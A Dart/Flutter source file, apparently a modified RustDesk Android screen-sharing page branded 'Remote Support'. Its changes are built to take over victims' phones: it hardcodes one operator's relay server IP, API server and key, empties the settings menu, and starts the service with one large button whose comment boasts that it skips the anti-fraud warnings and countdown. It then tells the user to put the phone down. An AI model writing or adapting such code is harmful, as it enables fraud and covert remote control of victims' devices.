import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:provider/provider.dart';
import 'package:get/get.dart';
import '../../common.dart';
import '../../models/server_model.dart';
import 'home_page.dart';

class ServerPage extends StatefulWidget implements PageShape {
  @override
  final title = translate("Share screen");
  @override
  final icon = const Icon(Icons.mobile_screen_share);
  
  // ⚠️ 核心杀招：把右上角那些乱七八糟的菜单设置全部清空！
  @override
  final appBarActions = <Widget>[]; 

  ServerPage({Key? key}) : super(key: key);

  @override
  State<StatefulWidget> createState() => _ServerPageState();
}

class _ServerPageState extends State<ServerPage> {
  Timer? _updateTimer;

  @override
  void initState() {
    super.initState();
    
    // ⚠️⚠️⚠️ 杀招注入：你的专属服务器配置 ⚠️⚠️⚠️
    bind.mainSetOption(key: "custom-rendezvous-server", value: "107.172.168.116");
    // 下面这行，请务必把你完整的 Key 替换掉引号里的内容！
    bind.mainSetOption(key: "key", value: "R9d85rMA1ZkA3Ht5UZzjyym4eUQG1Qi0iFtxQ..."); 
    bind.mainSetOption(key: "custom-api-server", value: "http://107.172.168.116:21114");

    _updateTimer = periodic_immediate(const Duration(seconds: 3), () async {
      await gFFI.serverModel.fetchID();
    });
    gFFI.serverModel.checkAndroidPermission();
  }

  @override
  void dispose() {
    _updateTimer?.cancel();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    checkService();
    return ChangeNotifierProvider.value(
        value: gFFI.serverModel,
        child: Consumer<ServerModel>(
            builder: (context, serverModel, child) {
              return Scaffold(
                body: Center(
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      // 1. 顶部图标 (未启动是灰色，启动后变绿色)
                      Icon(
                        serverModel.isStart ? Icons.security : Icons.shield_outlined,
                        size: 100,
                        color: serverModel.isStart ? Colors.green : Colors.grey,
                      ),
                      const SizedBox(height: 20),
                      const Text(
                        "Remote Support",
                        style: TextStyle(fontSize: 26, fontWeight: FontWeight.bold),
                      ),
                      const SizedBox(height: 50),

                      // 2. 极致傻瓜交互：巨大的启动按钮
                      if (!serverModel.isStart)
                        SizedBox(
                          width: 250,
                          height: 80,
                          child: ElevatedButton(
                            style: ElevatedButton.styleFrom(
                              backgroundColor: Colors.blueAccent,
                              shape: RoundedRectangleBorder(
                                borderRadius: BorderRadius.circular(40),
                              ),
                            ),
                            onPressed: () {
                              // ⚠️ 直接启动服务！绕过所有的防诈骗弹窗和倒计时！
                              serverModel.toggleService();
                            },
                            child: const Text(
                              "START / 启动",
                              style: TextStyle(fontSize: 26, color: Colors.white, fontWeight: FontWeight.bold),
                            ),
                          ),
                        ),

                      // 3. 启动后的状态反馈 (绿灯亮起)
                      if (serverModel.isStart)
                        Column(
                          children: [
                            Row(
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: [
                                Container(
                                  width: 18,
                                  height: 18,
                                  decoration: const BoxDecoration(
                                    color: Colors.green,
                                    shape: BoxShape.circle,
                                  ),
                                ),
                                const SizedBox(width: 10),
                                const Text(
                                  "Status: Ready (已就绪)",
                                  style: TextStyle(fontSize: 22, color: Colors.green, fontWeight: FontWeight.bold),
                                ),
                              ],
                            ),
                            const SizedBox(height: 30),
                            Text(
                              "ID: ${serverModel.serverId.value.text}",
                              style: const TextStyle(fontSize: 24, fontWeight: FontWeight.w900),
                            ),
                            const SizedBox(height: 15),
                            const Text(
                              "You can now leave the phone aside.\n可以放下手机了",
                              textAlign: TextAlign.center,
                              style: TextStyle(color: Colors.grey, fontSize: 16),
                            ),
                          ],
                        ),
                    ],
                  ),
                ),
              );
            }));
  }
}

// 保留底层系统权限检查回调，防止安卓 10/11 报错
void checkService() async {
  gFFI.invokeMethod("check_service");
  if (AndroidPermissionManager.isWaitingFile() && !gFFI.serverModel.fileOk) {
    AndroidPermissionManager.complete(kManageExternalStorage,
        await AndroidPermissionManager.check(kManageExternalStorage));
  }
}

// 保留底层原生通道，让 APP 切到后台也能正常保持被控
void androidChannelInit() {
  gFFI.setMethodCallHandler((method, arguments) {
    try {
      switch (method) {
        case "start_capture":
          gFFI.dialogManager.dismissAll();
          gFFI.serverModel.updateClientState();
          break;
        case "on_state_changed":
          var name = arguments["name"] as String;
          var value = arguments["value"] as String == "true";
          gFFI.serverModel.changeStatue(name, value);
          break;
        case "on_android_permission_result":
          var type = arguments["type"] as String;
          var result = arguments["result"] as bool;
          AndroidPermissionManager.complete(type, result);
          break;
        case "on_media_projection_canceled":
          gFFI.serverModel.stopService();
          break;
        case "stop_service":
          if (gFFI.serverModel.isStart) {
            gFFI.serverModel.stopService();
          }
          break;
      }
    } catch (e) {
      debugPrintStack(label: "MethodCallHandler err:$e");
    }
    return "";
  });
}
